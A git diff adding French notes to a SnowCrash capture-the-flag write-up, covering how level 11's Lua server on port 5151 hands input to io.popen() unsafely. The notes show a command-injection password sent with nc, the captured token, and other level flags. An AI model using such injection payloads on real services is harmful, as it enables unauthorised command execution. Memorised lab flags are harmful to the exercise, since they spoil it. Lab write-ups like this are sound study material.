@@ -116,4 +116,15 @@ flag: woupa2yuojeeaaed06riuj63c
 
 feulo4b72j7edeahuete3no7c
 
->>>>>>> master
+//LEVEL 11
+Ya un serveur lua sur 5151 qui demande un mot de passe mais on s'en fou
+On va juste lui passer un argument frauduleux car io.popen() présente une grosse faille.
+Si on lui passe "foo; `getflag>/tmp/flag`", il executera bien gentillement notre commande en tant que flag11.
+
+level11@SnowCrash:~$ nc localhost 5151
+Password: foo; `getflag>/tmp/flag`
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+//LEVEL 12
